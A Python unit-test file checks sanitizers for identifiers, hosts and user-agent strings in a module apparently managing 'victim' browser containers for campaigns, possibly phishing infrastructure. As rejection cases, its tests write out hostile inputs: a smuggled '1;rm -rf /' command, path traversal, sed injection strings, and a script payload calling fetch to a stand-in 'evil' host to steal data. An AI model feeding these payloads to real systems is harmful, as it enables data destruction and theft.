import os
import unittest

os.environ.setdefault("INTERNAL_API_KEY", "i" * 32)

from utils.victim_containers import (
    _require_safe_host,
    _require_safe_identifier,
    _sanitize_user_agent,
)


class RequireSafeIdentifierTests(unittest.TestCase):
    """CONTAINER_NAME/CAMPAIGN_ID/VICTIM_ID/VICTIM_API_KEY/EXTENSIONS entries
    are patched into victim container files with plain `sed -i "s|X|$X|g"`
    (startVNC.sh / startSelkies.sh). These values are generated server-side
    (uuid4 hex fragments, HMAC hex digests) but this is the single guard
    that lets the entrypoint scripts trust them without re-validating."""

    def test_accepts_real_world_generated_values(self):
        for value in ("064e6530", "p-bitm-064e6530-a1b2c3d4", "plugin-a1b2c3d4"):
            self.assertEqual(_require_safe_identifier("x", value), value)

    def test_rejects_empty_value(self):
        with self.assertRaises(RuntimeError):
            _require_safe_identifier("x", "")

    def test_rejects_sed_delimiter_and_metacharacters(self):
        for value in ("abc|s|x|y|", "x&y", "x\\ny", "../../etc", "a b", 'a"b'):
            with self.assertRaises(RuntimeError):
                _require_safe_identifier("x", value)


class RequireSafeHostTests(unittest.TestCase):
    def test_accepts_ipv4_ipv6_and_hostnames(self):
        for value in ("192.168.1.10", "::1", "campaign.example.com"):
            self.assertEqual(_require_safe_host("IP", value), value)

    def test_rejects_shell_metacharacters(self):
        for value in ("", "1;rm -rf /", "host|evil", "host&evil"):
            with self.assertRaises(RuntimeError):
                _require_safe_host("IP", value)


class SanitizeUserAgentTests(unittest.TestCase):
    """USER_AGENT comes straight from the victim's browser (an HTTP header we
    don't control). The entrypoint JSON-encodes it before writing extension
    JavaScript, while this boundary strips raw control bytes and bounds it."""

    def test_leaves_a_real_user_agent_untouched(self):
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.assertEqual(_sanitize_user_agent(ua), ua)

    def test_preserves_characters_that_json_encoding_makes_safe(self):
        malicious = 'Mozilla/5.0"; fetch("https://evil/steal"); const x="pwned'
        cleaned = _sanitize_user_agent(malicious)
        self.assertEqual(cleaned, malicious)

    def test_strips_control_bytes_and_bounds_length(self):
        cleaned = _sanitize_user_agent("A\r\nB\x7f" + ("C" * 2000))
        self.assertEqual(cleaned[:2], "AB")
        self.assertEqual(len(cleaned), 1024)

    def test_falls_back_to_unknown_when_nothing_safe_remains(self):
        self.assertEqual(_sanitize_user_agent("\r\n\x7f"), "unknown")
        self.assertEqual(_sanitize_user_agent(""), "unknown")


if __name__ == "__main__":
    unittest.main()
